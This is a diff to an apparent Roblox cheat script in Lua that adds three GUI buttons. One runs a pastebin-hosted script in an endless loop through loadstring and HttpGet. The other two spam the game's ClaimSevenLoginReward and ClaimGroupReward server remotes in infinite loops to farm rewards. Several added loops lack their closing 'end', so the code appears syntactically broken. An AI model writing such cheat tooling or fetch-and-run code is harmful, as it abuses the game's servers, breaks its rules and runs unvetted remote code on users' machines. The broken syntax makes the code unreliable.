@@ -90,6 +90,40 @@ game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("FuseW
 end
         end
     })
+
+    PlayerTab:AddButton({
+        Name = "Claim All Codes",
+        Callback = function()
+            while wait() do
+loadstring(game:HttpGet("https://pastebin.com/raw/gemGBZKu",true))()
+        end
+    })
+
+    PlayerTab:AddButton({
+        Name = "Daily Rewards",
+        Callback = function()
+            while wait() do
+ for x = 1, 7 do
+        local args = {
+            [1] = x
+        }
+
+        game:GetService("ReplicatedStorage").Remotes.ClaimSevenLoginReward:FireServer(unpack(args))
+        task.wait()
+    end 
+        end
+    })
+
+    PlayerTab:AddButton({
+        Name = "Claim Group Rewards",
+        Callback = function()
+            while wait() do
+game:GetService("ReplicatedStorage").Remotes.ClaimGroupReward:InvokeServer()
+        end
+    })
+
+
+
 local playerNames = {}
 for _, player in pairs(game.Players:GetPlayers()) do
     table.insert(playerNames, player.Name)
